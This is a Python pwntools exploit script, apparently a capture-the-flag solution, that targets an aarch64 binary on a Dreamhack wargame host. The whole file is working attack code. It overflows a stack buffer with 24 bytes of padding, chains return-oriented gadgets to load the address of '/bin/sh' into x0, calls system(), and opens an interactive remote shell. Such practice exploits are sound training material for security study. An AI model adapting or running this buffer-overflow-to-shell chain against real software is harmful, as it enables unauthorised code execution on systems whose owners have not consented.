#!/usr/bin/env python3
from pwn import *
import platform

PORT = 15259
HOST = "host3.dreamhack.games"

elf = context.binary = ELF('./prob', checksec=False)
context.arch = 'aarch64'
context.log_level = 'debug'

# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-aarch64.so.1', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        if platform.machine() not in ["aarch64", "arm64"]:
            return process(['qemu-aarch64', elf.path])
        return elf.process()

p = conn()

# GDB()

SYSTEM = 0x401b00
BIN_SH  = 0x4671c8

POP_X19_RET      = 0x459038
MOV_X0_X19_RET   = 0x459034

pl = flat(
    b'A'*24,

    # main saved x30 -> first gadget
    POP_X19_RET,

    # stack for POP_X19_RET
    0xdeadbeefdeadbeef,   # x29
    MOV_X0_X19_RET,       # x30
    BIN_SH,                # x19 = "/bin/sh"
    0x0,                  # x20

    # stack for MOV_X0_X19_RET
    0xdeadbeefdeadbeef,   # x29
    SYSTEM,               # x30 -> system
    0x0,                  # x19 dummy
    0x0                   # x20 dummy
)

p.sendlineafter(b'input: ', pl)
p.interactive()